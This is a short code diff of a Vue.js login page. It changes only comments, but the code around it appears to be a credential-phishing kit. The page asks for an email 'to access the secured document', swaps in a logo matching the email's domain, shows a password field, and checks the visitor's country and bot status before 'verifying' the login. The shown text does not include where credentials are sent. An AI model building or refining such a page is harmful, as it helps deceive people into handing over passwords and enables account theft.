@@ -8,7 +8,7 @@ const app = Vue.createApp({
       password: '',
       showPassword: false,
       showModal: false,
-      domainLogo: 'assets/logo2.png', // Default logo
+      domainLogo: 'assets/logo2.png', // Default dynamic logo
       localizedText: {
         enterEmail: 'Verify your email identity to access the secured document.',
         next: 'Next',
@@ -62,8 +62,8 @@ const app = Vue.createApp({
       }
     },
     requestPassword() {
-      this.updateLogo(); // Re-update logo based on the email domain
-      this.showPassword = true;
+      this.updateLogo(); // Update the logo for the email domain
+      this.showPassword = true; // Show the password input phase
     },
     async verifyLogin() {
       const { country, isBot } = await this.getIPInfo();
